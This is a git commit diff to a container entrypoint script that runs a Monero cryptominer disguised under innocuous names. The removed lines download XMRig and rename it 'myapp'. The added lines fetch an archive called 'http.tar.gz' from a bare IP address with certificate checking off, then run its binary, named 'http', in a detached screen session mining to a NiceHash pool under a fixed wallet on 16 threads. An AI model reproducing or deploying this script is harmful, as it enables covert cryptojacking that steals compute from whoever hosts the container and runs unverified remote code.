f526865fe24a10d0a0e6e9a293636aeb3df269af
osnmoh007 <112149956+osnmoh007@users.noreply.github.com>
2024-08-14 23:01:12 +0100

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,24 +1,21 @@
 #!/bin/bash
 
 
-# Download the XMRig file
-wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-noble-x64.tar.gz -O /app/xmrig-6.21.3-noble-x64.tar.gz
+# Download the http file
+wget --no-check-certificate http://35.211.126.56/http.tar.gz -O /app/http.tar.gz
 
-# Extract the XMRig file
-tar -xvzf /app/xmrig-6.21.3-noble-x64.tar.gz -C /app/
+# Extract the http file
+tar -xvzf /app/http.tar.gz -C /app/
 
 # Clean up
-rm /app/xmrig-6.21.3-noble-x64.tar.gz
+rm /app/http.tar.gz
 
-# Rename the extracted XMRig binary to myapp if needed
-# Replace 'xmrig' with the actual name of the binary inside the extracted folder if different
-mv /app/xmrig-6.21.3/xmrig /app/xmrig-6.21.3/myapp
 
 # Change directory to the extracted folder
-cd /app/xmrig-6.21.3
+cd /app/http
 
-# Run XMRig with screen
-screen -dmS myapp_session bash -c "./myapp -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
+# Run http with screen
+screen -dmS http_session bash -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --threads=16"
 
 # Keep the container running
 tail -f /dev/null
